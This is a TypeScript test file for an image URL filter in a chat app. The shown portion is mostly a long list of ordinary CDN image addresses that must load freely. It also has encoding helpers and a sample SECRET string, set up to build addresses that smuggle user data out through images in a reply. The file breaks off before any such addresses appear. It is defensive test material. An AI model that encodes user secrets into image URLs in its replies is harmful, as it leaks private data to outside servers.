import { describe, expect, test } from "bun:test";

import { REPLY_BIT_BUDGET } from "./imageAddressBits";
import { heldImages } from "./imageBudget";
import { imageUrlVerdict } from "./imageUrlFilter";

// A corpus for the image address filter: ordinary image addresses in the shapes real CDNs use, which must load without
// asking, and addresses shaped to carry data, which must ask. The test prints the counts. After the addresses come whole
// replies: ordinary ones, where no image may wait, and ones with many such addresses, where some must wait.

const b64 = (text: string) => btoa(text);
const b64url = (text: string) => b64(text).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
const hex = (text: string) => Array.from(text, (char) => char.charCodeAt(0).toString(16).padStart(2, "0")).join("");

/** Bytes that are not text: what data looks like once it has been encrypted or compressed. Deterministic. */
function noise(length: number, seed: number): number[] {
  let state = (seed * 2654435761) >>> 0 || 1;
  return Array.from({ length }, () => {
    state ^= state << 13;
    state ^= state >>> 17;
    state ^= state << 5;
    state >>>= 0;
    return state & 0xff;
  });
}
const noiseHex = (bytes: number, seed: number) => noise(bytes, seed).map((byte) => byte.toString(16).padStart(2, "0")).join("");
const noiseB64 = (bytes: number, seed: number) => btoa(String.fromCharCode(...noise(bytes, seed)));
const noiseB64url = (bytes: number, seed: number) => noiseB64(bytes, seed).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
const chunks = (text: string, size: number) => text.match(new RegExp(`.{1,${size}}`, "g")) ?? [];
const BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
const base62 = (length: number, seed: number) => noise(length, seed).map((byte) => BASE62[byte % 62]).join("");
/** Random CJK ideographs. */
const cjk = (length: number, seed: number) => noise(length * 2, seed).reduce((text, byte, i, bytes) => (i % 2 ? text + String.fromCharCode(0x4e00 + ((bytes[i - 1]! << 8) | byte) % 0x5000) : text), "");
/** Random ideographs outside the basic plane (two UTF-16 units each): 12 bits each. */
const cjkExtensionB = (length: number, seed: number) => noise(length * 2, seed).reduce((text, byte, i, bytes) => (i % 2 ? text + String.fromCodePoint(0x20000 + (((bytes[i - 1]! << 8) | byte) % 4096)) : text), "");
const LOWER = "abcdefghijklmnopqrstuvwxyz";
/** Made-up lower-case words, `size` letters each: log2(26) = 4.7 bits a letter. */
const madeUpWords = (count: number, size: number, seed: number) => chunks(noise(count * size, seed).map((byte) => LOWER[byte % 26]).join(""), size);

const UUID_A = "4f8a2c1d-7b3e-4a6f-9c2d-1e5f8a7b3c4d";
const UUID_B = "9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d";
const UUID_C = "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d";
const MD5 = "205e460b479e2e5b48aec07710c08d50";
const SHA1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709";
const SHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
const SIGV4 =
  "X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20261118%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261118T120000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host";

const SECRET = "The user's name is Jordan and the account balance is 48213 dollars";

/** Ordinary image addresses: every one must load without asking. */
const MUST_LOAD: Record<string, string[]> = {
  imgur: [
    "https://i.imgur.com/AbCd123.png",
    "https://i.imgur.com/Zk3xQpL.jpeg",
    "https://i.imgur.com/a1B2c3Dh.jpg",
    "https://i.imgur.com/Zk3xQpLm.gif",
    "https://i.imgur.com/removed.png",
  ],
  github: [
    "https://avatars.githubusercontent.com/u/583231?v=4",
    "https://avatars.githubusercontent.com/u/9919?s=200&v=4",
    "https://avatars.githubusercontent.com/in/15368?s=64&v=4",
    "https://raw.githubusercontent.com/facebook/react/main/fixtures/dom/public/react-logo.svg",
    "https://raw.githubusercontent.com/torvalds/linux/6f7da290413ba713f0cdd9ff1a2a9bb129ef4f6c/Documentation/logo.gif",
    "https://user-images.githubusercontent.com/23264/106598434-9e719e00-654f-11eb-9e59-6167043cfa01.png",
    `https://github.com/user-attachments/assets/${UUID_A}`,
    `https://github.com/TinyCloudLabs/tinychat/assets/1234567/${UUID_B}`,
    `https://repository-images.githubusercontent.com/70107786/${UUID_C}`,
    `https://opengraph.githubassets.com/${SHA256}/vercel/next.js`,
    "https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png",
    "https://github.com/vercel/next.js/actions/workflows/build_and_test.yml/badge.svg?branch=canary",
  ],
  wikimedia: [
    "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Example.jpg/320px-Example.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/280px-PNG_transparency_demonstration_1.png",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Van_Gogh_-_Starry_Night_-_Google_Art_Project.jpg/1280px-Van_Gogh_-_Starry_Night_-_Google_Art_Project.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/Image_created_with_a_mobile_phone.png/1200px-Image_created_with_a_mobile_phone.png",
    "https://upload.wikimedia.org/wikipedia/en/thumb/8/80/Wikipedia-logo-v2.svg/200px-Wikipedia-logo-v2.svg.png",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Caf%C3%A9_de_Flore.jpg/640px-Caf%C3%A9_de_Flore.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/%E5%AF%8C%E5%A3%AB%E5%B1%B1.jpg/640px-%E5%AF%8C%E5%A3%AB%E5%B1%B1.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/a/ab/File:Cat.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/GoldenGateBridge-001.jpg/1024px-GoldenGateBridge-001.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/A_view_of_the_Golden_Gate_Bridge_from_the_Marin_Headlands_at_sunset.jpg/800px-A_view_of_the_Golden_Gate_Bridge_from_the_Marin_Headlands_at_sunset.jpg",
    `https://wikimedia.org/api/rest_v1/media/math/render/svg/${SHA1}`,
    "https://en.wikipedia.org/static/images/project-logos/enwiki.png",
  ],
  cloudfront: [
    "https://d111111abcdef8.cloudfront.net/a.png",
    `https://d2q79iu7y748jz.cloudfront.net/s/_squarelogo/256x256/${MD5}`,
    "https://d1a2b3c4d5e6f7.cloudfront.net/images/products/1234/hero-800x600.jpg",
    "https://d3njjcbhbojbot.cloudfront.net/api/utilities/v1/imageproxy/https://coursera-course-photos.s3.amazonaws.com/ab/cdef1234/logo.png?auto=format%2Ccompress&dpr=1&w=150&h=150",
  ],
  "s3 and other object stores": [
    "https://my-bucket.s3.amazonaws.com/photos/2026/11/team.jpg",
    "https://my-company-assets.s3.us-west-2.amazonaws.com/uploads/avatar-128.png",
    "https://s3.amazonaws.com/my-bucket/images/logo.png",
    "https://s3.eu-central-1.amazonaws.com/static.example.com/img/header.jpg",
    `https://my-bucket.s3.us-east-1.amazonaws.com/uploads/photo.jpg?${SIGV4}&X-Amz-Signature=${noiseHex(32, 1)}`,
    `https://my-bucket.s3.amazonaws.com/exports/2026/chart.png?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&${SIGV4}&X-Amz-Signature=${noiseHex(32, 2)}&x-id=GetObject`,
    `https://s3.us-west-2.amazonaws.com/secure.notion-static.com/${UUID_A}/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20230101%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230101T000000Z&X-Amz-Expires=86400&X-Amz-Signature=${noiseHex(32, 3)}&X-Amz-SignedHeaders=host&x-id=GetObject`,
    `https://${MD5}.r2.cloudflarestorage.com/media/img.png?${SIGV4.replace("AKIAIOSFODNN7EXAMPLE", noiseHex(16, 4)).replace("us-east-1", "auto")}&X-Amz-Signature=${noiseHex(32, 5)}`,
    `https://pub-${MD5}.r2.dev/photos/cat.jpg`,
    "https://my-space.nyc3.digitaloceanspaces.com/uploads/photo.jpg",
    "https://my-space.nyc3.cdn.digitaloceanspaces.com/uploads/2026/photo-large.jpg",
    "https://storage.googleapis.com/my-bucket/images/photo.jpg",
    "https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Gemini_hero.width-1300.png",
    "https://myaccount.blob.core.windows.net/images/photo.jpg",
    `https://myaccount.blob.core.windows.net/images/photo.jpg?sv=2023-11-03&se=2026-11-18T12%3A00%3A00Z&sr=b&sp=r&sig=${encodeURIComponent(noiseB64(32, 7))}`,
    "https://firebasestorage.googleapis.com/v0/b/my-app.appspot.com/o/images%2Fprofile%2Fphoto.jpg?alt=media&token=" + UUID_A,
    "https://qwmxkzpvbtnrhdjslfcg.supabase.co/storage/v1/object/public/avatars/user-123/profile.png",
    "https://x7k2m9p4q1wd1abc.public.blob.vercel-storage.com/avatar-Xk3p9Qw7Rm2Tz8LbN4cWfYd6.png",
  ],
  cloudinary: [
    "https://res.cloudinary.com/demo/image/upload/sample.jpg",
    "https://res.cloudinary.com/demo/image/upload/c_fill,w_300,h_200/v1312461204/sample.jpg",
    "https://res.cloudinary.com/demo/image/upload/w_400,h_400,c_crop,g_face,r_max/w_200/lady.jpg",
    "https://res.cloudinary.com/demo/image/upload/f_auto,q_auto/v1700000000/folder/my-image.png",
    "https://res.cloudinary.com/demo/image/upload/e_blur:300,q_auto:good/docs/models.jpg",
    "https://res.cloudinary.com/demo/image/fetch/f_auto,q_auto,w_600/https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png",
    "https://res.cloudinary.com/dk3gbflat/image/upload/t_media_lib_thumb/v1699999999/x8k2m9p4q7w1.jpg",
    "https://res.cloudinary.com/demo/video/upload/so_2.5,w_640,h_360,c_fill/dog.jpg",
  ],
  unsplash: [
    "https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?w=800&q=80",
    "https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?auto=format&fit=crop&w=1200&q=80",
    "https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80",
    "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3wxMjA3fDB8MXxzZWFyY2h8Mnx8bmF0dXJlfGVufDB8fHx8MTcwMDAwMDAwMHww&ixlib=rb-4.0.3&q=80&w=1080",
    "https://plus.unsplash.com/premium_photo-1661962309696-c429126b237e?w=500&auto=format&fit=crop&q=60",
    "https://source.unsplash.com/random/800x600",
  ],
  gravatar: [
    `https://www.gravatar.com/avatar/${MD5}`,
    `https://gravatar.com/avatar/${MD5}?s=200&d=identicon`,
    `https://secure.gravatar.com/avatar/${SHA256}?s=96&d=mp&r=g`,
    `https://0.gravatar.com/avatar/${MD5}?s=64&d=retro&r=pg`,
    `https://www.gravatar.com/avatar/${MD5}?d=https%3A%2F%2Fexample.com%2Fimages%2Fdefault-avatar.png&s=80`,
    `https://2.gravatar.com/avatar/${MD5}.jpg?size=128`,
  ],
  "google user content": [
    "https://lh3.googleusercontent.com/a/ACg8ocJx7Qm2Rk9TzLp4VbN8cWfYd3HsEuGi6Ko1Ma5XjZt0Bq=s96-c",
    "https://lh3.googleusercontent.com/a-/ALV-UjXk3p9Qw7Rm2Tz8LbN4cWfYd6HsEuGi1Ko5MaXjZt0BqVnCyPlOe=s120-c-k-no",
    `https://lh3.googleusercontent.com/pw/AP1GczN${noiseB64url(84, 8)}=w1200-h800-s-no`,
    `https://lh5.googleusercontent.com/p/AF1QipN${noiseB64url(30, 9)}=w408-h306-k-no`,
    "https://lh3.googleusercontent.com/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012345=w1000",
    `https://yt3.ggpht.com/ytc/AIdro_k${noiseB64url(33, 10)}=s88-c-k-c0x00ffffff-no-rj`,
    `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT${noiseB64url(36, 12)}&s=10`,
    `https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsE${noiseB64url(150, 13)}/s1600/photo.jpg`,
    "https://www.google.com/s2/favicons?domain=example.com&sz=64",
    "https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png",
    "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png",
    "https://maps.googleapis.com/maps/api/staticmap?center=40.714728,-73.998672&zoom=12&size=400x400&maptype=roadmap",
    "https://drive.google.com/uc?export=view&id=1AbCdEfGhIjKlMnOpQrStUvWxYz0123456",
    "https://drive.google.com/thumbnail?id=1AbCdEfGhIjKlMnOpQrStUvWxYz0123456&sz=w1000",
  ],
  shopify: [
    "https://cdn.shopify.com/s/files/1/0533/2089/files/placeholder-images-image_large.png?v=1530129081",
    "https://cdn.shopify.com/s/files/1/0070/7032/files/trending-products_c8d0d15c-9afc-47e3-9ba2-f7bad0505b9b.png?format=jpg&quality=90&v=1614559651",
    "https://cdn.shopify.com/s/files/1/1234/5678/products/blue-t-shirt-front_800x.jpg?v=1699999999",
    "https://example-store.myshopify.com/cdn/shop/files/hero-banner.jpg?v=1699999999&width=1500",
    "https://cdn.shopify.com/shopifycloud/web/assets/v1/vite/client/en/assets/hero-desktop-4f8a2c1d.webp",
  ],
  substack: [
    `https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F${UUID_A}_1024x768.png`,
    `https://substack-post-media.s3.amazonaws.com/public/images/${UUID_B}_1456x816.jpeg`,
    `https://substackcdn.com/image/fetch/w_96,h_96,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F${UUID_C}_256x256.png`,
    "https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fexample.substack.com%2Fimg%2Fsubstack.png",
  ],
  notion: [
    `https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F${UUID_A}%2F${UUID_B}%2FUntitled.png?table=block&id=${UUID_C}&cache=v2`,
    `https://www.notion.so/image/https%3A%2F%2Fimages.unsplash.com%2Fphoto-1503023345310-bd7c1de61c7d%3Fixlib%3Drb-4.0.3%26q%3D85%26fm%3Djpg%26crop%3Dentropy%26cs%3Dsrgb?table=block&id=${UUID_A}&width=2000&cache=v2`,
    "https://www.notion.so/images/page-cover/woodcuts_1.jpg",
    `https://img.notionusercontent.com/s3/prod-files-secure%2F${UUID_A}%2F${UUID_B}%2Fimage.png/size/w=2000?exp=1763500000&sig=${noiseB64url(32, 14)}&id=${UUID_C}`,
    `https://file.notion.so/f/f/${UUID_A}/${UUID_B}/image.png?table=block&id=${UUID_C}&spaceId=${UUID_A}&expirationTimestamp=1763500000000&signature=${noiseB64url(32, 15)}&downloadName=image.png`,
  ],
  discord: [
    `https://cdn.discordapp.com/attachments/1098765432109876543/1198765432109876543/image.png?ex=65f1a2b3&is=65ef5133&hm=${noiseHex(32, 16)}&`,
    `https://media.discordapp.net/attachments/1098765432109876543/1198765432109876543/screenshot.png?ex=65f1a2b3&is=65ef5133&hm=${noiseHex(32, 17)}&=&format=webp&quality=lossless&width=1100&height=619`,
    `https://cdn.discordapp.com/avatars/123456789012345678/a_${MD5}.png?size=256`,
    "https://cdn.discordapp.com/emojis/1098765432109876543.png?v=1",
    `https://cdn.discordapp.com/icons/1098765432109876543/${MD5}.webp?size=128`,
    "https://cdn.discordapp.com/embed/avatars/0.png",
  ],
  "hashed asset names": [
    "https://example.com/assets/logo-3f9a2b.png",
    "https://example.com/static/media/hero.4f8a2c1d.jpg",
    "https://example.com/_next/static/media/banner.1a2b3c4d.png",
    "https://cdn.example.com/build/app-icon.d41d8cd98f00b204e980.svg",
    "https://example.com/assets/index-BkR3x9Qz.png",
    `https://example.com/packs/media/images/header-${MD5}.png`,
    `https://cdn.example.com/${MD5}.png`,
    `https://cdn.example.com/${SHA1}.jpg`,
    `https://cdn.example.com/${SHA256}.jpg`,
    `https://cdn.example.com/${SHA256.toUpperCase()}.jpg`,
    "https://static.example.org/img/sprite-9f86d081884c7d65.webp",
    "https://example.com/static/3f9a2b1c4d5e/images/photo.jpg",
    `https://example.com/media/catalog/product/cache/${MD5}/s/h/shoe-red.jpg`,
    "https://example.com/img/A1B2C3D4-E5F6-4A7B-8C9D-0E1F2A3B4C5D.jpeg",
    "https://cdn.example.com/CACHE/images/photos/sunset/0a1b2c3d4e5f.jpg",
  ],
  "next.js and other image proxies": [
    "https://example.com/_next/image?url=%2Fimages%2Fhero.png&w=1200&q=75",
    `https://example.com/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fabc12xyz%2Fproduction%2F${SHA1}-1600x900.jpg&w=1920&q=75`,
    "https://example.vercel.app/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fprofile.4f8a2c1d.jpg&w=640&q=75",
    "https://i0.wp.com/example.com/wp-content/uploads/2026/01/photo.jpg?resize=800%2C600&ssl=1",
    "https://example.com/cdn-cgi/image/width=800,quality=75,format=auto/uploads/hero.jpg",
    "https://img.example.com/thumb/600x400/smart/filters:quality(80)/uploads/photo.jpg",
    "https://img.example.com/resize?width=800&height=600&path=/uploads/2026/photo.jpg",
    "https://img.shields.io/endpoint?url=https://example.com/badge.json",
    `https://camo.githubusercontent.com/${SHA256}/${hex("https://img.shields.io/npm/v/next.svg?style=for-the-badge&labelColor=000000")}`,
    `https://camo.githubusercontent.com/${SHA1}/${hex("https://example.com/images/logo.png")}`,
    "https://img.itch.zone/aW1nLzMxNDMwMTEwLmpwZw==/350x196%23c/Zu2lqP.jpg",
  ],
  youtube: [
    "https://i.ytimg.com/vi/dQw4w9WgXcQ/hqdefault.jpg",
    "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
    "https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg",
    "https://i.ytimg.com/vi_webp/9bZkp7q19f0/sddefault.webp",
    "https://i.ytimg.com/vi/dQw4w9WgXcQ/hq720.jpg?sqp=-oaymwEcCNAFEJQDSFXyq4qpAw4IARUAAIhCGAFwAcABBg==&rs=AOn4CLBx7Qm2Rk9TzLp4VbN8cWfYd3HsEu",
  ],
  "social and media cdns": [
    "https://pbs.twimg.com/media/GAbCdEfXkAAh1Jk?format=jpg&name=large",
    "https://pbs.twimg.com/media/GAbCdEfXkAAh1Jk.jpg",
    "https://pbs.twimg.com/profile_images/1683325380441128960/yRsRRjGO_400x400.jpg",
    "https://pbs.twimg.com/card_img/1783325380441128960/aBcD1234?format=jpg&name=medium",
    "https://abs.twimg.com/emoji/v2/72x72/1f600.png",
    `https://preview.redd.it/x7k2m9p4q1wd1.png?width=640&crop=smart&auto=webp&s=${SHA1}`,
    "https://i.redd.it/x7k2m9p4q1wd1.jpg",
    `https://external-preview.redd.it/${noiseB64url(32, 18)}.jpg?width=640&crop=smart&auto=webp&s=${SHA1}`,
    "https://styles.redditmedia.com/t5_2qh1i/styles/communityIcon_x7k2m9p4q1wd1.png",
    "https://miro.medium.com/v2/resize:fit:1400/1*dmbNkD5D-u45r44go_cf0g.png",
    "https://miro.medium.com/v2/resize:fit:720/format:webp/0*aBcDeFgHiJkLmNoP.jpeg",
    "https://cdn-images-1.medium.com/max/1600/1*dmbNkD5D-u45r44go_cf0g.jpeg",
    `https://i.pinimg.com/736x/1a/2b/3c/${MD5}.jpg`,
    `https://i.pinimg.com/originals/1a/2b/3c/${MD5}.png`,
    "https://m.media-amazon.com/images/I/71abcDEFghL._AC_SL1500_.jpg",
    "https://m.media-amazon.com/images/M/MV5BMTc5MDE2ODcwNV5BMl5BanBnXkFtZTgwMzI2NzQ2NzM@._V1_SX300.jpg",
    "https://images-na.ssl-images-amazon.com/images/I/51Zymoq7UnL._SX329_BO1,204,203,200_.jpg",
    "https://live.staticflickr.com/65535/51234567890_abcdef1234_b.jpg",
    "https://farm5.staticflickr.com/4567/23456789012_0a1b2c3d4e_z.jpg",
    `https://64.media.tumblr.com/${MD5}/0a1b2c3d4e5f6071-ab/s1280x1920/${SHA1}.jpg`,
    `https://media.licdn.com/dms/image/v2/D4E03AQHk3p9Qw7Rm2T/profile-displayphoto-shrink_800_800/profile-displayphoto-shrink_800_800/0/1700000000000?e=1768435200&v=beta&t=${noiseB64url(32, 19)}`,
    "https://i.scdn.co/image/ab67616d0000b273e8b066f70c206551210d902b",
    "https://is1-ssl.mzstatic.com/image/thumb/Music116/v4/ab/cd/ef/abcdef12-3456-7890-abcd-ef1234567890/cover.jpg/600x600bb.jpg",
    "https://cdn.akamai.steamstatic.com/steam/apps/570/header.jpg?t=1700000000",
    "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/730/capsule_616x353.jpg",
    "https://scontent-lax3-1.xx.fbcdn.net/v/t39.30808-6/412345678_1234567890123456_1234567890123456789_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=5f2048&_nc_ohc=Xk3p9Qw7Rm2AX8LbN4c&_nc_ht=scontent-lax3-1.xx&oh=00_AfBx7Qm2Rk9TzLp4VbN8cWfYd3HsEuGi6Ko1Ma5XjZt0Bq&oe=65F1A2B3",
    "https://scontent.cdninstagram.com/v/t51.2885-15/412345678_1234567890123456_1234567890123456789_n.jpg?stp=dst-jpg_e35_p1080x1080&_nc_ht=scontent.cdninstagram.com&_nc_cat=1&_nc_ohc=Xk3p9Qw7Rm2AX8LbN4c&edm=AP_V10EBAAAA&ccb=7-5&oh=00_AfBx7Qm2Rk9TzLp4VbN8cWfYd3HsEuGi6Ko1Ma5XjZt0Bq&oe=65F1A2B3&_nc_sid=2999b8",
    "https://media.giphy.com/media/3o7TKSjRrfIPjeiVyM/giphy.gif",
    `https://media2.giphy.com/media/v1.${b64url("cid=790b7611x7k2m9p4q1wd1&ep=v1_gifs_search&rid=giphy.gif&ct=g")}/3o7TKSjRrfIPjeiVyM/giphy.gif`,
    "https://resizing.flixster.com/9N_G8FYaBomXUcIDhE--9zBYGK8=/164x246/v2/https://resizing.flixster.com/-XZAfHZM39UwaGJIFWKAE8fS0ak=/v3/t/assets/p9915832_p_v10_af.jpg",
    "https://thumb.wikimedia.org/wikipedia/commons/thumb/6/6b/Muemxwebplatz03082014c99.jpg/120px-Muemxwebplatz03082014c99.jpg?utm_source=de.wikipedia.org&utm_campaign=parser&utm_content=thumbnail",
    "https://media.tenor.com/x7K2m9P4q1wAAAAC/happy-dance.gif",
    "https://c.tenor.com/x7K2m9P4q1wAAAAd/tenor.gif",
    "https://files.slack.com/files-pri/T024BE7LD-F0123ABCD/image.png",
    "https://emoji.slack-edge.com/T024BE7LD/partyparrot/1a2b3c4d5e6f7a8b.gif",
    "https://avatars.slack-edge.com/2026-01-15/1234567890123_1a2b3c4d5e6f7a8b9c0d_192.png",
    `https://static-cdn.jtvnw.net/jtv_user_pictures/${UUID_A}-profile_image-300x300.png`,
    "https://static-cdn.jtvnw.net/previews-ttv/live_user_example-1280x720.jpg",
    "https://cdn.bsky.app/img/feed_thumbnail/plain/did:plc:z72i7hdynmk6r22z27h6tvur/bafkreihdwdcefgh4dqkjv67uzcmw7ojee6xedzdetojuzjevtenxquvyku@jpeg",
    "https://ipfs.io/ipfs/QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco/wiki/I/m/Vincent_van_Gogh.jpg",
    "https://dl.dropboxusercontent.com/s/x7k2m9p4q1wd1ab/photo.jpg",
    "https://www.dropbox.com/scl/fi/x7k2m9p4q1wd1abx7k2m9/photo.jpg?rlkey=x7k2m9p4q1wd1abx7k2m9p4q1&raw=1",
    "https://cdn-avatars.huggingface.co/v1/production/uploads/1a2b3c4d5e6f7a8b9c0d1e2f/Xk3p9Qw7Rm2Tz8LbN4cWf.png",
    "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/transformers/tasks/car.jpg",
  ],
  "cms, commerce and news": [
    "https://images.ctfassets.net/abc123xyz789/4f8A2c1D7b3E4a6F9c2D1e/0a1b2c3d4e5f60718293a4b5c6d7e8f9/hero.png?w=1200&fm=webp&q=80",
    `https://cdn.sanity.io/images/abc12xyz/production/${SHA1}-1600x900.jpg?w=800&auto=format`,
    "https://assets.imgix.net/unsplash/bridge.jpg?w=600&h=400&fit=crop&auto=format,compress",
    `https://example.imgix.net/products/shoe.png?w=400&s=${MD5}`,
    `https://imagedelivery.net/Vi7wi5KSItxGFsWRG2Us6Q/${UUID_A}/public`,
    "https://example.com/wp-content/uploads/2026/11/IMG_20261118_123456-1024x768.jpg",
    "https://example.com/wp-content/uploads/2025/03/Screenshot-2025-03-14-at-10.32.45-AM.png",
    "https://www.example.org/wp-content/uploads/2026/11/how-to-bake-sourdough-bread-at-home-hero.jpg",
    "https://example.files.wordpress.com/2026/01/sunset-over-lake.jpg?w=1024&h=768",
    "https://s.w.org/images/core/emoji/14.0.0/72x72/1f600.png",
    "https://blog.example.com/content/images/size/w1200/2026/11/cover.png",
    "https://images.example.com/is/image/Brand/1234567_001_main?wid=800&hei=800&fmt=jpeg&qlt=85",
    "https://www.example.com/sites/default/files/styles/large/public/2026-11/field_image/photo_0.jpg?itok=Xk3p9Qw7",
    "https://ichef.bbci.co.uk/news/1024/branded_news/1a2b/production/_123456789_gettyimages-1234567890.jpg",
    "https://static01.nyt.com/images/2026/11/17/multimedia/17economy-01-abcd/17economy-01-abcd-superJumbo.jpg?quality=75&auto=webp",
    "https://media.cnn.com/api/v1/images/stellar/prod/gettyimages-1234567890.jpg?c=16x9&q=h_720,w_1280,c_fill",
    `https://i.guim.co.uk/img/media/${SHA1}/0_100_5000_3000/master/5000.jpg?width=1200&quality=85&auto=format&fit=max&s=${MD5}`,
    `https://www.reuters.com/resizer/v2/XK3P9QW7RM2TZ8LBN4CWFYD6HS.jpg?auth=${SHA256}&width=1200&quality=80`,
    "https://images-assets.nasa.gov/image/PIA12235/PIA12235~orig.jpg",
    "https://apod.nasa.gov/apod/image/2611/M31_HubbleSpitzerGendler_2000.jpg",
  ],
  "developer and utility images": [
    "https://img.shields.io/badge/build-passing-brightgreen.svg",
    "https://img.shields.io/github/stars/vercel/next.js?style=social",
    "https://img.shields.io/npm/v/react.svg?style=flat-square",
    "https://img.shields.io/badge/license-MIT-blue.svg?style=for-the-badge&logo=github&logoColor=white",
    "https://badgen.net/npm/v/express",
    "https://codecov.io/gh/owner/repo/branch/main/graph/badge.svg?token=ABCDEF1234",
    "https://travis-ci.org/owner/repo.svg?branch=master",
    "https://github-readme-stats.vercel.app/api?username=anuraghazra&show_icons=true&theme=radical",
    "https://i.stack.imgur.com/AbCd1.png",
    "https://i.sstatic.net/AbCd1234.png",
    "https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png",
    "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f600.png",
    "https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/svgs/solid/house.svg",
    "https://unpkg.com/simple-icons@v9/icons/github.svg",
    "https://via.placeholder.com/300x200.png?text=Hello+World",
    "https://placehold.co/600x400/png",
    "https://picsum.photos/seed/picsum/200/300",
    "https://picsum.photos/id/237/200/300",
    "https://dummyimage.com/600x400/000/fff&text=Sample",
    "https://api.dicebear.com/7.x/avataaars/svg?seed=Felix",
    "https://ui-avatars.com/api/?name=John+Doe&background=0D8ABC&color=fff&size=128",
    "https://robohash.org/tinycloud.png?size=200x200",
    "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=Example",
    "https://latex.codecogs.com/png.latex?x%5E2%2By%5E2%3Dz%5E2",
    "https://tile.openstreetmap.org/12/2048/1362.png",
    "https://api.mapbox.com/styles/v1/mapbox/streets-v12/static/-122.4241,37.78,14.25,0,60/600x600",
    "https://example.com/api/og?title=Hello%20World&theme=dark",
  ],
  "plain sites": [
    "https://example.com/photos/2026/11/team-offsite-group-photo.jpg",
    "https://cdn.example.com/products/12345/main.jpg?width=600&height=600",
    "https://static.example.com/img/icons/arrow-right.svg",
    "https://example.co.uk/images/staff/jane-smith.jpg",
    "https://example.com/image.php?id=12345&size=large",
    "https://cdn.example.com/avatars/user_1234567.png?t=1700000000",
    "https://example.com/photo.jpg?v=2&cb=1700000000000",
    "https://example.com/avatar.png?utm_source=newsletter&utm_medium=email",
    "https://example.com/DCIM/100APPLE/IMG_0042.HEIC",
    "https://media.example.com/2026/11/18/09/15/42/screenshot_20261118-091542.png",
    "https://example.com/My%20Vacation%20Photos/Day%201/IMG_0042.JPG",
    "https://example.com/images/%E2%9C%85-done.png",
    "https://example.com/a.png#a-fragment-that-is-never-sent-to-the-server-and-is-long-enough-to-matter-here",
    "https://example.com/100%.png",
    "https://example.com:8443/logo.png",
    "http://example.com/logo.png",
    "http://www.example.org/images/banner.gif",
    "http://example.com:8080/logo.png",
    "https://EXAMPLE.com/Logo.PNG",
    "https://xn--mnchen-3ya.de/bilder/rathaus.jpg",
    "https://例え.jp/画像/富士山.png",
    "https://tinycloud.one/logo.svg",
    "https://app.tinycloud.one/assets/icon-192.png",
    "https://www.tinycloud.chat/og.png",
    "https://node.tinycloud.xyz/public/avatar.png",
  ],
  // A file name escaped twice by the publisher's CDN: the only thing under the second layer is spaces.
  "spaces written %2520": [
